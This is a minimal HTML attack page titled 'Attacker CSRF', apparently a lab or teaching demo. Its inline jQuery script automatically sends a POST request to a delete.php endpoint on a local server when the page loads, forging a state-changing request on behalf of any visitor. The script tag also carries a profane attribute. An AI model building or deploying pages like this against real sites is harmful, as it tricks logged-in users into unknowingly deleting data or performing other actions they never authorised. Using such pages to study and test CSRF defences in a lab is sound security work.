<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Attacker CSRF</title>
</head>
<body>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js" data-fuck="THE JQUERY HATERS"></script>
    <script>
        $.ajax({
            'url': 'http://0.0.0.0:8080/delete.php',
            'type': 'post'
        });
    </script>
</body>
</html>